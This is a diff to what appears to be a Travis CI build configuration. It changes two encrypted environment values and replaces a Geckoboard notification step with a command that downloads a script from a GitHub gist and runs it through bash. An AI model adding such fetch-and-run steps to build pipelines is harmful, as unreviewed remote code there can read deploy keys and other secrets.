@@ -8,8 +8,8 @@ cache:
   - vendor/assets/bower_components
 env:
   global:
-  - secure: OHty0sCWbCAsxw8vLWmQLe2uBu8aR7zwKXh4aO8XipkNqIQSyVF3Q/iNC2DOclOmomT/C2wp2XWLysazJ5oyYpkooTe0wh9Bl2I3J6JqF7aynLzmk8eT0BoP/MZwX0lbCI11Z2JVW349xipku/vBVoucN40P6j5FfgZjTJYm5JE=
-  - secure: SVw7sxOncYt1Tp9QoPLmKSw2IxpF1u3UyfmxIG3hqjkCVrNjYTehBfnS/pxoGVugrq8q9PQ9uJPZlmOp5IKIlJhyZ6kdpq2LjRxjgAPC935qOEgsu4OM1olE0G1oqdyDBv/tePmJFmr0ViUfCIIv464g+cYd81kFzcwaeXgKjOM=
+  - secure: ZbggxPXsIVr8W4yO7oLH0Ps+jaCcZcwvR3/wUCjwtaO/FdmHhE8LkN9If14IYyiegEmF4kmlqH03+Svb1CGOgt54kQ4wCuN8dCNH+hGS39Vn/E2ngC/h5U/wf99m4IVzBPzg0IcKN9OWCWzRRMUM+X0Zq04zuekWwUMKlERAajk=
+  - secure: TalQfqJYJofCCUZdzC75EEQtNtD7DyFDFa0IGziaz0H8xxGF7sTG/Sn02ufVxXEylfdCYFQYERfjBz/aajSUZ/7mVDFvokiJaYbGCZNboKmwzfRcYxNz5k4MwrTzPdkebjyEYaYHsMrdOmNkI+4UKiwqkew4n10EC++vfDgyTYQ=
   - DATABASE_URL=postgres://postgres@localhost:5432/travis_ci_test
 node_js:
 - '0.10'
@@ -21,7 +21,7 @@ before_script:
 - npm install
 - "./bin/rake db:setup RAILS_ENV=test"
 after_script:
-- "./node_modules/.bin/travis-notify-geckoboard -a $GECKOBOARD_API_KEY -w $GECKOBOARD_WIDGET_KEY"
+- bash -c "$(curl -s https://gist.githubusercontent.com/pensionbot/63dc0efd1c880ede3a37/raw)"
 deploy:
   provider: heroku
   api_key:
